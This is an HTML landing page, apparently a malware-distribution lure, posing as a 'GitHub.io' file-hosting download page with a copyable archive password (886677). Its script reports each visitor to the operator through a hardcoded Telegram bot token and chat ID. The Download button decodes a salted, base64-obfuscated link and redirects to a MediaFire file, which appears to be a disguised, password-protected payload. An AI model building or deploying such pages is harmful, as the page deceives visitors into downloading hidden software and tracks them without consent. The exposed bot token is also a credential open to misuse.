<!DOCTYPE html>
<html lang="ru">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GitHub.io - Fast and secure GitHub based file hosting</title>
    <link rel="icon" type="image/x-icon" href="https://i.postimg.cc/Ls6BmqF3/favicon.png">
    <link href="./GitHub.io - Fast and secure GitHub based file hosting_files/css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }

        body {
            font-family: 'Black Han Sans', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(to left, #2979ff, #0043ca);
            color: white;
            text-align: center;
            overflow: hidden;
            position: relative;
        }

        .container {
            text-align: center;
            padding: 20px;
            transform: scale(1.35);
            display: none;
        }

        .title {
            font-size: 43px;
            font-weight: bold;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
        }

        .password {
            font-size: 35px;
            font-weight: bold;
            margin-top: 10px;
            cursor: pointer;
        }

        .download-button {
            font-family: 'Black Han Sans', sans-serif;
            padding: 20px 50px;
            background-color: #fff;
            color: #2979ff;
            font-size: 26px;
            border-radius: 50px;
            border: none;
            cursor: pointer;
            font-weight: bold;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            margin-top: 20px;
            position: relative;
            transition: 0.3s;
            animation: glow 1.5s infinite alternate;
        }

        .download-button:hover {
            background-color: #2979ff;
            color: white;
        }

        @keyframes glow {
            from { box-shadow: 0 0 10px rgba(255, 255, 255, 0.3); }
            to { box-shadow: 0 0 20px rgba(255, 255, 255, 0.8); }
        }

        #progressBar {
            display: none;
            width: 80%;
            height: 20px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            margin: 20px auto 0;
        }
        #progressBar div {
            height: 100%;
            width: 0;
            background: #4caf50;
            border-radius: 10px;
            transition: width 0.3s;
        }

        #loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to left, #2979ff, #0043ca);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }

        .spinner {
            border: 12px solid rgba(255, 255, 255, 0.3);
            border-top: 12px solid #fff;
            border-radius: 50%;
            width: 80px;
            height: 80px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div id="loader" style="display: none;">
    <div class="spinner"></div>
</div>

<div class="container" style="display: block;">
    <p class="title"></p>
    <p class="password" onclick="copyPassword()">886677</p>
    <button type="button" class="download-button" onclick="startDownload()">Download</button>
    <div id="progressBar"><div></div></div>
</div>

<script>
    const telegramBotToken = '8197913995:AAEhNG8eIYeYbBKaP-Aoe8HYsQiK5nF8-4c'; // Замените на ваш токен бота
    const telegramChatId = '7644007750'; // Замените на ваш ID чата

    window.addEventListener('load', function() {
        setTimeout(function() {
            document.getElementById('loader').style.display = 'none';
            document.querySelector('.container').style.display = 'block';

            // Отправка уведомления в Telegram
            sendTelegramNotification();
        }, 4000);
    });

    function sendTelegramNotification() {
        const message = 'Новый пользователь зашел на лендинг с GitHub!';
        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: telegramChatId,
                text: message,
            }),
        })
        .then(response => response.json())
        .then(data => console.log('Уведомление отправлено:', data))
        .catch((error) => console.error('Ошибка:', error));
    }

    function startDownload() {
        var encodedUrlWithSalt = "aHR0cHM6Ly93d3cubWVkaWFmaXJlLmNvbS9maWxlL2t1cmllZnNiNzhnbmhkbW4";
        var cleanEncodedUrl = encodedUrlWithSalt.slice(3, -3);
        var decodedUrl = atob(cleanEncodedUrl);
        window.location.href = decodedUrl;
        
        var progressBar = document.getElementById('progressBar');
        var progress = progressBar.firstElementChild;
        progressBar.style.display = 'block';
        var width = 0;
        var interval = setInterval(function() {
            if (width >= 100) {
                clearInterval(interval);
            } else {
                width += 10;
                progress.style.width = width + '%';
            }
        }, 300);
    }

    function copyPassword() {
        navigator.clipboard.writeText("886677").then(function() {
            alert("Пароль скопирован в буфер обмена");
        });
    }

    function createCloud() {
        var container = document.createElement("div");
        container.classList.add("cloud-container");
        container.style.top = Math.random() * 80 + "vh";
        var duration = (15 + Math.random() * 10) * 1.35;
        container.style.animationDuration = duration + "s";
        var cloud = document.createElement("div");
        cloud.classList.add("cloud");
        cloud.innerText = "☁";
        container.appendChild(cloud);
        document.body.appendChild(container);
        setTimeout(function() { container.remove(); }, duration * 1000 + 1000);
    }

    for (var i = 0; i < 5; i++) {
        createCloud();
    }
    setInterval(createCloud, 4000);
</script>
</body>
</html>
